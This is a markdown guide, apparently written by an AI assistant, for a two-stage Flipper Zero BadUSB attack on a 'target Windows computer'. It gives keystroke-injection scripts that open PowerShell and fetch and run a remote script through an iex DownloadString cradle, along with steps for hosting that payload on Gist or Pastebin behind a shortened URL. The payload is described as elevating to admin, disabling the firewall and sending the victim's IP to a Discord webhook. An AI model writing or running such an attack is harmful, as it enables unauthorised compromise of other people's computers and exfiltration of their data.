# Flipper Zero Two-Stage Payload Instructions

We've created a two-stage approach to solve the keyboard layout and character issues with the Flipper Zero:

## How This Approach Works

1. **Stage 1 (Flipper Zero Script)**: A minimal script that opens PowerShell and downloads the main payload
2. **Stage 2 (Hosted PowerShell Script)**: The full WSL setup script that runs after being downloaded

This approach is much more reliable because it minimizes the amount of text the Flipper Zero needs to type directly.

## Setup Instructions

### 1. Host the PowerShell Script

First, you need to host the `wsl_setup.ps1` file somewhere publicly accessible:

**Option A: GitHub Gist**
1. Go to https://gist.github.com/
2. Create a new gist with the `wsl_setup.ps1` file content
3. Make the gist public and copy the "Raw" URL

**Option B: Pastebin**
1. Go to https://pastebin.com/
2. Paste the contents of `wsl_setup.ps1`
3. Set expiration to "Never"
4. Create the paste and copy the "raw" URL (add "/raw" to the end of the URL)

**Option C: Use a URL shortener**
1. After getting your raw URL from either method above
2. Go to a service like https://bitly.com/
3. Create a shortened URL that's easy to type (like "bit.ly/wsl-setup")

### 2. Update the Flipper Zero Script

Edit the `flipper_badusb_simple.txt` file to point to your hosted script:

```
# Update this line with your actual URL
STRING iex (New-Object Net.WebClient).DownloadString('YOUR_URL_HERE')
```

### 3. Load the Script on Your Flipper Zero

1. Connect your Flipper Zero to your computer
2. Open qFlipper
3. Navigate to SD Card/badusb/
4. Upload the `flipper_badusb_simple.txt` file

## Running the Attack

1. Plug your Flipper Zero into the target Windows computer
2. On the Flipper Zero, navigate to BadUSB app
3. Select the script and press the center button

The Flipper will:
1. Open PowerShell
2. Download and execute the full script from your hosted location
3. The script will self-elevate to admin, disable firewall, install WSL, etc.
4. The script will send the IP to your Discord webhook when complete

## Troubleshooting

If you still encounter issues:

1. **Check the URL**: Make sure your shortened URL works by testing it in a browser
2. **Try a simpler command**: If all else fails, try this simpler Flipper script:
   ```
   DELAY 3000
   GUI r
   DELAY 1000
   STRING powershell
   ENTER
   DELAY 2000
   STRING Start-Process powershell -Verb RunAs -ArgumentList "-Command iex (New-Object Net.WebClient).DownloadString('YOUR_URL_HERE')"
   ENTER
   ```

3. **Manual approach**: If automation fails, you can also:
   - Use the Flipper to just open PowerShell
   - Manually copy and paste the download command from a note on your phone 